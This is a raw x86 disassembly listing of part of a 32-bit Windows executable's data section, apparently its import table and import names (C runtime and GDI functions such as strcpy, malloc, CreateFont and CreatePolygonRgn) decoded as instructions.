  41256c:	and    ch,BYTE PTR [edx]
  41256e:	add    DWORD PTR [eax],eax
  412570:	sub    al,0x2a
  412572:	add    DWORD PTR [eax],eax
  412574:	xor    al,0x2a
  412576:	add    DWORD PTR [eax],eax
  412578:	inc    eax
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+0x2a],cl
  41257e:	add    DWORD PTR [eax],eax
  412580:	push   esp
  412581:	sub    al,BYTE PTR [ecx]
  412583:	add    BYTE PTR [esi+0x2a],bl
  412586:	add    DWORD PTR [eax],eax
  412588:	data16 sub al,BYTE PTR [ecx]
  41258b:	add    BYTE PTR [eax+0x2a],dh
  41258e:	add    DWORD PTR [eax],eax
  412590:	jp     0x4125bc
  412592:	add    DWORD PTR [eax],eax
  412594:	sub    BYTE PTR [edx],0x1
  412597:	add    BYTE PTR [esi-0x65fffed6],cl
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x53fffed6],ah
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	retf   0x12a
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    dl,dh
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    dh,bh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	add    BYTE PTR [eax],al
  4125c7:	add    BYTE PTR [edx],bl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [esi],ch
  4125cd:	sub    eax,DWORD PTR [ecx]
  4125cf:	add    BYTE PTR [esi],bh
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4125d7:	add    BYTE PTR [eax+0x2b],bl
  4125da:	add    DWORD PTR [eax],eax
  4125dc:	push   0x7e00012b
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    BYTE PTR [edx-0x59fffed5],dl
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4125f2:	add    DWORD PTR [eax],eax
  4125f4:	loopne 0x412621
  4125f6:	add    DWORD PTR [eax],eax
  4125f8:	in     al,dx
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    dh,bh
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    BYTE PTR [esi],dl
  412601:	sub    al,0x1
  412603:	add    BYTE PTR [eax],ch
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [eax],bh
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [edx+0x2c],al
  41260e:	add    DWORD PTR [eax],eax
  412610:	pop    eax
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [edx+0x2c],dh
  412616:	add    DWORD PTR [eax],eax
  412618:	jle    0x412646
  41261a:	add    DWORD PTR [eax],eax
  41261c:	mov    ch,BYTE PTR [ecx+eax*1]
  41261f:	add    BYTE PTR [esi-0x47fffed4],bl
  412625:	sub    al,0x1
  412627:	add    ah,al
  412629:	sub    al,0x1
  41262b:	add    dl,dl
  41262d:	sub    al,0x1
  41262f:	add    ah,ah
  412631:	sub    al,0x1
  412633:	add    al,dh
  412635:	sub    al,0x1
  412637:	add    BYTE PTR [esi],al
  412639:	sub    eax,0x2d140001
  41263e:	add    DWORD PTR [eax],eax
  412640:	and    ch,BYTE PTR ds:0x2d300001
  412646:	add    DWORD PTR [eax],eax
  412648:	dec    edx
  412649:	sub    eax,0x2d5e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	push   0x2d
  412652:	add    DWORD PTR [eax],eax
  412654:	jp     0x412683
  412656:	add    DWORD PTR [eax],eax
  412658:	xchg   esi,eax
  412659:	sub    eax,0x2da60001
  41265e:	add    DWORD PTR [eax],eax
  412660:	mov    dh,0x2d
  412662:	add    DWORD PTR [eax],eax
  412664:	(bad)  
  412665:	sub    eax,0x2dd20001
  41266a:	add    DWORD PTR [eax],eax
  41266c:	loop   0x41269b
  41266e:	add    DWORD PTR [eax],eax
  412670:	hlt    
  412671:	sub    eax,0x2dfe0001
  412676:	add    DWORD PTR [eax],eax
  412678:	push   cs
  412679:	add    DWORD PTR cs:[eax],eax
  41267c:	push   ds
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	sub    BYTE PTR [esi],ch
  412682:	add    DWORD PTR [eax],eax
  412684:	add    BYTE PTR [eax],al
  412686:	add    BYTE PTR [eax],al
  412688:	dec    edx
  412689:	add    DWORD PTR cs:[eax],eax
  41268c:	add    BYTE PTR [eax],al
  41268e:	add    BYTE PTR [eax],al
  412690:	push   0x8000012e
  412695:	add    DWORD PTR cs:[eax],eax
  412698:	mov    WORD PTR [esi],gs
  41269a:	add    DWORD PTR [eax],eax
  41269c:	call   0x12e:0xb200012e
  4126a3:	add    dh,al
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	fsubr  QWORD PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0xf84127df
  4126b1:	add    DWORD PTR cs:[eax],eax
  4126b4:	adc    BYTE PTR [edi],ch
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	push   ds
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	xor    BYTE PTR [edi],ch
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	inc    eax
  4126c1:	das    
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	push   esi
  4126c5:	das    
  4126c6:	add    DWORD PTR [eax],eax
  4126c8:	data16 das 
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	jbe    0x4126fd
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	mov    ch,BYTE PTR [edi]
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	xchg   esi,eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	mov    dl,0x2f
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	enter  0x12f,0x0
  4126e4:	loopne 0x412715
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	hlt    
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	add    dh,BYTE PTR [eax]
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	sbb    BYTE PTR [eax],dh
  4126f2:	add    DWORD PTR [eax],eax
  4126f4:	xor    BYTE PTR cs:[ecx],al
  4126f7:	add    BYTE PTR [edx],bh
  4126f9:	xor    BYTE PTR [ecx],al
  4126fb:	add    BYTE PTR [eax+0x30],cl
  4126fe:	add    DWORD PTR [eax],eax
  412700:	push   edx
  412701:	xor    BYTE PTR [ecx],al
  412703:	add    BYTE PTR [esi+0x30],ah
  412706:	add    DWORD PTR [eax],eax
  412708:	jbe    0x41273a
  41270a:	add    DWORD PTR [eax],eax
  41270c:	mov    dh,BYTE PTR [eax]
  41270e:	add    DWORD PTR [eax],eax
  412710:	pushf  
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax-0x3bfffed0],dh
  412719:	xor    BYTE PTR [ecx],al
  41271b:	add    ah,dl
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    dl,ch
  412721:	xor    BYTE PTR [ecx],al
  412723:	add    BYTE PTR [edx],al
  412725:	xor    DWORD PTR [ecx],eax
  412727:	add    BYTE PTR [edx],bl
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [esi],ah
  41272d:	xor    DWORD PTR [ecx],eax
  41272f:	add    BYTE PTR [eax],bh
  412731:	xor    DWORD PTR [ecx],eax
  412733:	add    BYTE PTR [edx+0x31],cl
  412736:	add    DWORD PTR [eax],eax
  412738:	push   esi
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [eax+0x31],ch
  41273e:	add    DWORD PTR [eax],eax
  412740:	jbe    0x412773
  412742:	add    DWORD PTR [eax],eax
  412744:	xor    BYTE PTR [ecx],0x1
  412747:	add    BYTE PTR [esi-0x59fffecf],dl
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    BYTE PTR [eax-0x2dfffecf],bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    dl,ch
  412759:	xor    DWORD PTR [ecx],eax
  41275b:	add    BYTE PTR [eax],al
  41275d:	add    BYTE PTR [eax],al
  41275f:	add    BYTE PTR [esi],al
  412761:	xor    al,BYTE PTR [ecx]
  412763:	add    BYTE PTR [edx+esi*1],bl
  412766:	add    DWORD PTR [eax],eax
  412768:	xor    dh,BYTE PTR [edx]
  41276a:	add    DWORD PTR [eax],eax
  41276c:	inc    edx
  41276d:	xor    al,BYTE PTR [ecx]
  41276f:	add    BYTE PTR [edx+0x32],dl
  412772:	add    DWORD PTR [eax],eax
  412774:	pusha  
  412775:	xor    al,BYTE PTR [ecx]
  412777:	add    BYTE PTR [eax+0x32],dh
  41277a:	add    DWORD PTR [eax],eax
  41277c:	test   BYTE PTR [edx],dh
  41277e:	add    DWORD PTR [eax],eax
  412780:	xchg   esp,eax
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    BYTE PTR [eax-0x41fffece],ch
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,cl
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    al,ah
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    al,dh
  412795:	xor    al,BYTE PTR [ecx]
  412797:	add    BYTE PTR [edx],al
  412799:	xor    eax,DWORD PTR [ecx]
  41279b:	add    BYTE PTR [edx],bl
  41279d:	xor    eax,DWORD PTR [ecx]
  41279f:	add    BYTE PTR [esi],ah
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1],dh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	inc    esp
  4127a9:	xor    eax,DWORD PTR [ecx]
  4127ab:	add    BYTE PTR [edx+0x33],dl
  4127ae:	add    DWORD PTR [eax],eax
  4127b0:	push   0x7a000133
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi-0x6bfffecd],al
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    BYTE PTR [esi-0x4bfffecd],ah
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    dh,al
  4127c9:	xor    eax,DWORD PTR [ecx]
  4127cb:	add    al,bl
  4127cd:	xor    eax,DWORD PTR [ecx]
  4127cf:	add    dl,ch
  4127d1:	xor    eax,DWORD PTR [ecx]
  4127d3:	add    dl,bh
  4127d5:	xor    eax,DWORD PTR [ecx]
  4127d7:	add    BYTE PTR [esi],al
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [esp+esi*1],bl
  4127de:	add    DWORD PTR [eax],eax
  4127e0:	cmp    BYTE PTR [ecx+eax*1],dh
  4127e3:	add    BYTE PTR [edx+0x34],dl
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	data16 xor al,0x1
  4127eb:	add    BYTE PTR [esp+esi*1+0x1],dh
  4127ef:	add    BYTE PTR [eax-0x6dfffecc],al
  4127f5:	xor    al,0x1
  4127f7:	add    BYTE PTR [edx-0x51fffecc],ah
  4127fd:	xor    al,0x1
  4127ff:	add    BYTE PTR [edx-0x37fffecc],bh
  412805:	xor    al,0x1
  412807:	add    al,ah
  412809:	xor    al,0x1
  41280b:	add    al,dh
  41280d:	xor    al,0x1
  41280f:	add    BYTE PTR [eax],cl
  412811:	xor    eax,0x351a0001
  412816:	add    DWORD PTR [eax],eax
  412818:	sub    dh,BYTE PTR ds:0x35380001
  41281e:	add    DWORD PTR [eax],eax
  412820:	dec    edx
  412821:	xor    eax,0x35580001
  412826:	add    DWORD PTR [eax],eax
  412828:	fs xor eax,0x35720001
  41282e:	add    DWORD PTR [eax],eax
  412830:	jl     0x412867
  412832:	add    DWORD PTR [eax],eax
  412834:	xchg   esp,eax
  412835:	xor    eax,0x35a40001
  41283a:	add    DWORD PTR [eax],eax
  41283c:	mov    ah,0x35
  41283e:	add    DWORD PTR [eax],eax
  412840:	ret    0x135
  412843:	add    al,dl
  412845:	xor    eax,0x35e00001
  41284a:	add    DWORD PTR [eax],eax
  41284c:	div    BYTE PTR ds:0x36080001
  412852:	add    DWORD PTR [eax],eax
  412854:	push   ss
  412855:	add    DWORD PTR ss:[eax],eax
  412858:	sub    al,0x36
  41285a:	add    DWORD PTR [eax],eax
  41285c:	cmp    dh,BYTE PTR [esi]
  41285e:	add    DWORD PTR [eax],eax
  412860:	push   edx
  412861:	add    DWORD PTR ss:[eax],eax
  412864:	pop    esi
  412865:	add    DWORD PTR ss:[eax],eax
  412868:	push   0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	jbe    0x4128a4
  41286e:	add    DWORD PTR [eax],eax
  412870:	test   BYTE PTR [esi],dh
  412872:	add    DWORD PTR [eax],eax
  412874:	xchg   esi,eax
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	mov    ds:0xb4000136,al
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	shl    BYTE PTR [esi],0x1
  412883:	add    dh,cl
  412885:	add    DWORD PTR ss:[eax],eax
  412888:	fdiv   QWORD PTR [esi]
  41288a:	add    DWORD PTR [eax],eax
  41288c:	call   0xf64129c7
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	add    al,0x37
  412896:	add    DWORD PTR [eax],eax
  412898:	adc    al,0x37
  41289a:	add    DWORD PTR [eax],eax
  41289c:	es aaa 
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	cmp    al,0x37
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	inc    esi
  4128a5:	aaa    
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	push   esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	fs aaa 
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	jbe    0x4128e9
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	test   BYTE PTR [edi],dh
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	cwde   
  4128b9:	aaa    
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    dl,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	les    esi,FWORD PTR [edi]
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	aam    0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	call   0xfa412a04
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	or     bh,BYTE PTR [eax]
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	push   ss
  4128d5:	cmp    BYTE PTR [ecx],al
  4128d7:	add    BYTE PTR [eax+edi*1],dh
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	inc    esi
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1+0x1],bl
  4128e3:	add    BYTE PTR [eax+0x38],bh
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	nop
  4128e9:	cmp    BYTE PTR [ecx],al
  4128eb:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	mov    edx,0xc8000138
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    ah,ah
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dl,dh
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    BYTE PTR [esi],al
  412905:	cmp    DWORD PTR [ecx],eax
  412907:	add    BYTE PTR [eax],bl
  412909:	cmp    DWORD PTR [ecx],eax
  41290b:	add    BYTE PTR [edx],ch
  41290d:	cmp    DWORD PTR [ecx],eax
  41290f:	add    BYTE PTR [edx],bh
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [eax+0x39],dl
  412916:	add    DWORD PTR [eax],eax
  412918:	cmp    WORD PTR [ecx],ax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    al,ch
  412921:	add    esi,DWORD PTR [ebx+0x74]
  412924:	jb     0x412989
  412926:	jo     0x4129a1
  412928:	add    BYTE PTR [eax],al
  41292a:	or     eax,0x676e7504
  41292f:	gs je  0x412995
  412932:	add    BYTE PTR [eax],al
  412934:	pop    edi
  412935:	add    esp,DWORD PTR [ebx+0x6c]
  412938:	gs popa 
  41293a:	jb     0x4129a1
  41293c:	jb     0x4129b0
  41293e:	add    BYTE PTR [eax],al
  412940:	sub    BYTE PTR [edi+esi*2],al
  412943:	arpl   WORD PTR [ebx+0x6e],si
  412946:	arpl   WORD PTR [ebp+0x70],bp
  412949:	add    ch,dh
  41294b:	add    BYTE PTR [edi+0x63],bl
  41294e:	outs   dx,DWORD PTR ds:[esi]
  41294f:	outs   dx,BYTE PTR ds:[esi]
  412950:	je     0x4129c4
  412952:	outs   dx,DWORD PTR ds:[esi]
  412953:	ins    BYTE PTR es:[edi],dx
  412954:	data16 jo 0x412957
  412957:	add    BYTE PTR [ebp+0x6c616d03],dh
  41295d:	ins    BYTE PTR es:[edi],dx
  41295e:	outs   dx,DWORD PTR ds:[esi]
  41295f:	arpl   WORD PTR [eax],ax
  412961:	add    BYTE PTR [ebx+0x735f5f00],dh
  412967:	gs je  0x4129c9
  41296a:	popa   
  41296b:	jo     0x4129dd
  41296d:	pop    edi
  41296e:	je     0x4129e9
  412970:	jo     0x4129d7
  412972:	add    BYTE PTR [eax],al
  412974:	add    eax,DWORD PTR [ebx+esi*2]
  412977:	jns    0x4129ec
  412979:	je     0x4129e0
  41297b:	ins    DWORD PTR es:[edi],dx
  41297c:	add    BYTE PTR [eax],al
  41297e:	mov    al,ds:0x705f5f00
  412983:	pop    edi
  412984:	pop    edi
  412985:	ins    WORD PTR es:[edi],dx
  412987:	outs   dx,DWORD PTR ds:[esi]
  412988:	fs add BYTE PTR gs:[eax],al
  41298c:	pop    ebp
  41298d:	add    esp,DWORD PTR [ebx+0x61]
  412990:	ins    BYTE PTR es:[edi],dx
  412991:	ins    BYTE PTR es:[edi],dx
  412992:	outs   dx,DWORD PTR ds:[esi]
  412993:	arpl   WORD PTR [eax],ax
  412995:	add    BYTE PTR [ebx+0x705f5f00],bl
  41299b:	pop    edi
  41299c:	pop    edi
  41299d:	arpl   WORD PTR [edi+0x6d],bp
  4129a0:	ins    DWORD PTR es:[edi],dx
  4129a1:	outs   dx,DWORD PTR ds:[esi]
  4129a2:	fs add BYTE PTR gs:[eax],al
  4129a6:	std    
  4129a7:	add    esi,DWORD PTR [ebx+0x74]
  4129aa:	jb     0x412a20
  4129ac:	outs   dx,DWORD PTR ds:[esi]
  4129ad:	jne    0x412a1b
  4129af:	add    BYTE PTR [esi],dl
  4129b1:	add    al,0x76
  4129b3:	jae    0x412a25
  4129b5:	jb     0x412a20
  4129b7:	outs   dx,BYTE PTR ds:[esi]
  4129b8:	je     0x412a20
  4129ba:	add    BYTE PTR [eax],al
  4129bc:	sub    al,0x4
  4129be:	ja     0x412a23
  4129c0:	jae    0x412a32
  4129c2:	bound  esi,QWORD PTR [edx+0x6b]
  4129c5:	add    bl,bl
  4129c7:	add    BYTE PTR [edi+0x61],bl
  4129ca:	ins    DWORD PTR es:[edi],dx
  4129cb:	jae    0x412a34
  4129cd:	pop    edi
  4129ce:	gs js  0x412a3a
  4129d1:	je     0x4129d3
  4129d3:	add    BYTE PTR [esi+0x6e695f01],al
  4129d9:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x94006d72
  4129e1:	add    ebp,DWORD PTR [ecx+0x73]
  4129e4:	popa   
  4129e5:	ins    BYTE PTR es:[edi],dx
  4129e6:	outs   dx,BYTE PTR ds:[esi]
  4129e7:	jne    0x412a56
  4129e9:	add    BYTE PTR [ebp+0x3],ch
  4129ec:	data16 addr16 gs je 0x412a54
  4129f1:	add    BYTE PTR [esi+0x73695f01],bl
  4129f7:	ins    DWORD PTR es:[edi],dx
  4129f8:	bound  esp,QWORD PTR [edx+0x6c]
  4129fb:	gs popa 
  4129fd:	add    BYTE PTR fs:[eax],al
  412a00:	pop    ebx
  412a01:	add    esp,DWORD PTR [edx+0x73]
  412a04:	gs popa 
  412a06:	jb     0x412a6b
  412a08:	push   0x7303e500
  412a0d:	je     0x412a81
  412a0f:	arpl   WORD PTR [eax+0x72],bp
  412a12:	add    BYTE PTR [eax],al
  412a14:	push   edx
  412a15:	add    BYTE PTR [edi+0x58],bl
  412a18:	arpl   WORD PTR [eax+0x74],si
  412a1b:	inc    esi
  412a1c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3e70072
  412a24:	jae    0x412a9a
  412a26:	jb     0x412a8b
  412a28:	outs   dx,DWORD PTR ds:[esi]
  412a29:	ins    BYTE PTR es:[edi],dx
  412a2a:	ins    BYTE PTR es:[edi],dx
  412a2b:	add    BYTE PTR [esi],al
  412a2d:	add    al,0x74
  412a2f:	imul   ebp,DWORD PTR [ebp+0x65],0x3b10000
  412a36:	ins    BYTE PTR es:[edi],dx
  412a37:	outs   dx,DWORD PTR ds:[esi]
  412a38:	arpl   WORD PTR [ecx+0x6c],sp
  412a3b:	je     0x412aa6
  412a3d:	ins    DWORD PTR es:[edi],dx
  412a3e:	add    BYTE PTR gs:[eax],bh
  412a41:	add    al,0x77
  412a43:	arpl   WORD PTR [ebx+0x74],si
  412a46:	outs   dx,DWORD PTR ds:[esi]
  412a47:	jne    0x412ab5
  412a49:	add    BYTE PTR [ecx],ah
  412a4b:	add    al,0x77
  412a4d:	arpl   WORD PTR [ebx+0x63],si
  412a50:	jo     0x412acb
  412a52:	add    BYTE PTR [eax],al
  412a54:	enter  0x7003,0x75
  412a58:	je     0x412abd
  412a5a:	push   0x78007261
  412a5f:	add    esp,DWORD PTR [esi+0x70]
  412a62:	jne    0x412ad8
  412a64:	arpl   WORD PTR [eax],ax
  412a66:	sbb    al,0x4
  412a68:	ja     0x412acd
  412a6a:	jae    0x412acf
  412a6c:	popa   
  412a6d:	je     0x412a6f
  412a6f:	add    dl,ch
  412a71:	add    esi,DWORD PTR [ebx+0x74]
  412a74:	jb     0x412ad9
  412a76:	jae    0x412ae8
  412a78:	outs   dx,BYTE PTR ds:[esi]
  412a79:	add    BYTE PTR [ebx+0x65736603],al
  412a7f:	imul   eax,DWORD PTR gs:[eax],0xffffffb7
  412a83:	add    ebp,DWORD PTR [ebp+0x62]
  412a86:	jae    0x412afc
  412a88:	outs   dx,DWORD PTR ds:[esi]
  412a89:	ja     0x412aee
  412a8b:	jae    0x412a8d
  412a8d:	add    BYTE PTR [ebx],cl
  412a8f:	add    al,0x74
  412a91:	outs   dx,DWORD PTR ds:[esi]
  412a92:	ja     0x412b00
  412a94:	outs   dx,DWORD PTR ds:[esi]
  412a95:	ja     0x412afc
  412a97:	jb     0x412a99
  412a99:	add    ah,cl
  412a9b:	add    esi,DWORD PTR [ecx+0x73]
  412a9e:	outs   dx,DWORD PTR ds:[esi]
  412a9f:	jb     0x412b15
  412aa1:	add    BYTE PTR [ecx],al
  412aa3:	add    al,0x73
  412aa5:	ja     0x412b1a
  412aa7:	arpl   WORD PTR [ecx+0x6e],sp
  412aaa:	data16 add BYTE PTR [ebx],ah
  412aad:	add    DWORD PTR [edi+0x65],ebx
  412ab0:	js     0x412b1b
  412ab2:	je     0x412ab4
  412ab4:	ss add al,0x77
  412ab7:	arpl   WORD PTR [ebx+0x74],si
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	ins    DWORD PTR es:[edi],dx
  412abc:	bound  esi,QWORD PTR [ebx+0x0]
  412abf:	add    al,ch
  412ac1:	add    BYTE PTR [edi+0x63],bl
  412ac4:	gs js  0x412b30
  412ac7:	je     0x412ac9
  412ac9:	add    BYTE PTR [ecx],ch
  412acb:	add    al,0x77
  412acd:	arpl   WORD PTR [ebx+0x6e],si
  412ad0:	arpl   WORD PTR [eax+0x79],si
  412ad3:	add    BYTE PTR [ebx+0x70736903],bl
  412ad9:	jb     0x412b44
  412adb:	outs   dx,BYTE PTR ds:[esi]
  412adc:	je     0x412ade
  412ade:	mov    ch,0x0
  412ae0:	pop    edi
  412ae1:	pop    edi
  412ae2:	jae    0x412b49
  412ae4:	je     0x412b5b
  412ae6:	jae    0x412b4d
  412ae8:	jb     0x412b57
  412aea:	popa   
  412aeb:	je     0x412b55
  412aed:	gs jb  0x412b62
  412af0:	add    BYTE PTR [eax],al
  412af2:	sbb    BYTE PTR [esi+esi*2],al
  412af5:	jae    0x412b6e
  412af7:	jo     0x412b6b
  412af9:	imul   ebp,DWORD PTR [esi+0x74],0x720066
  412b00:	pop    edi
  412b01:	pop    edi
  412b02:	addr16 gs je 0x412b73
  412b06:	popa   
  412b07:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b0e:	dec    ebp
  412b0f:	push   ebx
  412b10:	push   esi
  412b11:	inc    ebx
  412b12:	push   edx
  412b13:	push   esp
  412b14:	cs fs ins BYTE PTR es:[edi],dx
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	add    BYTE PTR [eax],al
  412b1a:	fadd   QWORD PTR [ecx]
  412b1c:	push   ebx
  412b1d:	gs je  0x412b64
  412b20:	dec    ecx
  412b21:	inc    edx
  412b22:	inc    ebx
  412b23:	outs   dx,DWORD PTR ds:[esi]
  412b24:	ins    BYTE PTR es:[edi],dx
  412b25:	outs   dx,DWORD PTR ds:[esi]
  412b26:	jb     0x412b7c
  412b28:	popa   
  412b29:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b2d:	add    bh,dl
  412b2f:	add    DWORD PTR [ebx+0x65],edx
  412b32:	je     0x412b76
  412b34:	jb     0x412bab
  412b36:	jae    0x412ba0
  412b38:	dec    edi
  412b39:	jb     0x412ba2
  412b3b:	inc    ebp
  412b3c:	js     0x412b3e
  412b3e:	add    DWORD PTR [eax],0x626d6f43
  412b44:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  412b4b:	add    BYTE PTR [ecx+eax*1],ah
  412b4e:	inc    edi
  412b4f:	gs je  0x412b94
  412b52:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  412b56:	gs add bh,cl
  412b59:	add    DWORD PTR [ebx+0x65],edx
  412b5c:	ins    BYTE PTR es:[edi],dx
  412b5d:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  412b62:	ins    BYTE PTR es:[edi],dx
  412b63:	gs je  0x412bda
  412b66:	add    BYTE PTR gs:[ecx+0x65724300],cl
  412b6d:	popa   
  412b6e:	je     0x412bd5
  412b70:	inc    edx
  412b71:	jb     0x412be8
  412b73:	jae    0x412bdd
  412b75:	dec    ecx
  412b76:	outs   dx,BYTE PTR ds:[esi]
  412b77:	imul   esi,DWORD PTR fs:[edx+0x65],0xaa007463
  412b7f:	add    BYTE PTR [ebx+0x72],al
  412b82:	gs popa 
  412b84:	je     0x412beb
  412b86:	push   eax
  412b87:	outs   dx,DWORD PTR ds:[esi]
  412b88:	ins    BYTE PTR es:[edi],dx
  412b89:	jns    0x412bf2
  412b8b:	outs   dx,DWORD PTR ds:[esi]
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	push   edx
  412b8e:	outs   dx,BYTE PTR ds:[si]
  412b90:	add    BYTE PTR [eax],al
  412b92:	mov    al,ds:0x65724300
  412b97:	popa   
  412b98:	je     0x412bff
  412b9a:	dec    eax
  412b9b:	popa   
  412b9c:	je     0x412c01
  412b9e:	push   0x73757242
  412ba3:	push   0x17a0000
  412ba8:	inc    edi
  412ba9:	gs je  0x412bff
  412bac:	jns    0x412c21
  412bae:	je     0x412c15
  412bb0:	ins    DWORD PTR es:[edi],dx
  412bb1:	push   eax
  412bb2:	popa   
  412bb3:	ins    BYTE PTR es:[edi],dx
  412bb4:	gs je  0x412c2b
  412bb7:	gs push ebp
  412bb9:	jae    0x412c20
  412bbb:	add    BYTE PTR [esi+0x65724300],bl
  412bc1:	popa   
  412bc2:	je     0x412c29
  412bc4:	inc    esi
  412bc5:	outs   dx,DWORD PTR ds:[esi]
  412bc6:	outs   dx,BYTE PTR ds:[esi]
  412bc7:	je     0x412c20
  412bc9:	add    BYTE PTR [ebp+0x65724300],bl
  412bcf:	popa   
  412bd0:	je     0x412c37
  412bd2:	inc    esi
  412bd3:	outs   dx,DWORD PTR ds:[esi]
  412bd4:	outs   dx,BYTE PTR ds:[esi]
  412bd5:	je     0x412c20
  412bd7:	outs   dx,BYTE PTR ds:[esi]
  412bd8:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  412be0:	mov    ah,0x1
  412be2:	push   eax
  412be3:	outs   dx,DWORD PTR ds:[esi]
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	jns    0x412c53
  412be7:	imul   ebp,DWORD PTR [esi+0x65],0x18a0000
  412bee:	inc    edi
  412bef:	gs je  0x412c46
  412bf2:	gs js  0x412c69
  412bf5:	dec    ebp
  412bf6:	gs je  0x412c6b
  412bf9:	imul   esp,DWORD PTR [ebx+0x73],0x20d0041
  412c00:	push   esp
  412c01:	jb     0x412c64
  412c03:	outs   dx,BYTE PTR ds:[esi]
  412c04:	jae    0x412c72
  412c06:	popa   
  412c07:	je     0x412c6e
  412c09:	inc    ebx
  412c0a:	push   0x65737261
  412c0f:	je     0x412c5a
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	outs   dx,WORD PTR ds:[esi]
